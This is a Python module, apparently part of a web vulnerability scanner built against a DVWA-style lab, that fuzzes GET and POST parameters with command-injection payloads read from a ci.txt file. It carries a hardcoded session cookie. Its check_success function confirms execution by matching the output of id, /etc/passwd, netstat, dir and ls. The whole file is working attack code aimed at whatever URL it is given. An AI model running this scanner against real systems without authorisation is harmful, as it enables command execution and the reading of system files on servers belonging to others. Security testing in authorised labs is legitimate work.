import requests
import os
import re
import time
cookies = {'PHPSESSID': 'f9m2qbt7rdgt5lmbb08k82ako0', 'security': 'low'}


def make_GET_form(url: str):
    dic = {}
    dic['vuln'] = ' CI'
    dic['method'] = 'GET'
    dic['url'] = url
    print("CI GET FIND" )
    return dic


def make_POST_form(url: str, data: dict):
    dic = {}
    dic['vuln'] = 'CI'
    dic['method'] = 'POST'
    dic['url'] = url
    dic['data'] = data
    print("CI POST FIND")
    return dic


def get_request(data, dic, target):
    global cookies
    key_list = list(dic.keys())
    for payload_name in key_list:
        tmp = dic
        tmp[payload_name] = '@@@@@@'
        middle_form = target
        key_list_tmp = list(tmp.keys())
        for idx, key in enumerate(key_list_tmp):
            if idx == 0:
                middle_form = middle_form + '?' + key + '=' + tmp[key]
            else:
                middle_form = middle_form + '&' + key + '=' + tmp[key]
        for payload in data:
            final_form = middle_form.replace('@@@@@@', payload.strip().replace(' ', '+'))
            try:
                test_res = requests.get(final_form, cookies=cookies,verify=False)
                print(final_form)
            except:
                print("ERROR on CI" + target)
                time.sleep(5)
                test_res = requests.get(final_form, cookies=cookies,verify=False)
            if check_success(test_res.text):
                return make_GET_form(final_form)
    return False


def scan_type1(url: str, params: dict):
    global cookies
    with open(os.path.dirname(os.path.realpath(__file__)) + '/ci.txt', "r") as f:
        data = f.readlines()

    for items in params.values():
        target = url + items['action']
        method = items['method']
 
        dic = {}
        for ipt in items['inputs']:
            dic[ipt['name']] = ipt['value']

        if method == 'post':
            key_list = list(dic.keys())
            for payload_name in key_list:
                #submit은 continue
                if payload_name.lower() == 'submit':
                    continue
                tmp = dic
                for payload in data:
                    tmp[payload_name] = payload.strip()
                    try:
                        test_res = requests.post(target, data=tmp, cookies=cookies,verify=False)
                        print(target)
                    except:
                        print("ERROR on CI " + target)
                        time.sleep(5)
                        test_res = requests.post(target, data=tmp, cookies=cookies,verify=False)
                    if check_success(test_res.text):
                        return make_POST_form(target, tmp)
        elif method == 'get':
            return get_request(data, dic, target)
        else:
            print('Error in ' + target + ', method type must be assigned')
            return False
    return False


def scan_type2(url: str):
    with open(os.path.dirname(os.path.realpath(__file__)) + '/ci.txt', "r") as f:
        data = f.readlines()

    params = re.split('=&?', url)
    target = params[0]
    del (params[0])
    key = ''
    dic = {}
    for i in range(len(params)):
        if i % 2 == 0:
            key = params[i]
        else:
            dic[key] = params[i]

    return get_request(data, dic, target)


def check_success(res):
    if re.search(r'uid=[\d]*(.*)gid=[\d]*(.*)groups=33(.*)', res):  # check id result
        return True
    if re.search(r'\w*:x:\d*:\d*:\w*:\/.*:\/.*', res):  # check /etc/passwd result
        return True
    if re.search(r'\w+\s+\d+\s+\[[\w\s]+]\s+[a-zA-Z]+\s+[A-Z]*\s*\d+[ \t]+[^\n]+',
                 res):  # check netstat -an linux/UNIX result
        return True
    if re.search(r'[A-Z]+\s+\d+.\d+.\d+.\d+:\d+\s+\d+.\d+.\d+.\d+:\d+\s+[A-Z]+',
                 res):  # check netstat -an windows result
        return True
    if re.search(r'\d+[^\w]\d+[^\w]\d+[^\n\d]{1,8}\d+:\d+[^\n\d]{1,10}(<DIR>)\s+[^\n]+', res):  # check dir result
        return True
    if re.search(r'[drwxs-]{10,12}\s+\d+\s+\w+\s+\w+\s+\d{1,7}\s[^\n]{4,15}\s+[^\n]+',
                 res):  # check ls something result
        return True

    return False


def ci_attack(arg1: str, arg2):
    if arg1.startswith('http'):
        return scan_type1(arg1, arg2)
    elif arg1 == 'get':
        return scan_type2(arg2)
    else:
        print('Error in ci_attack')
        return False
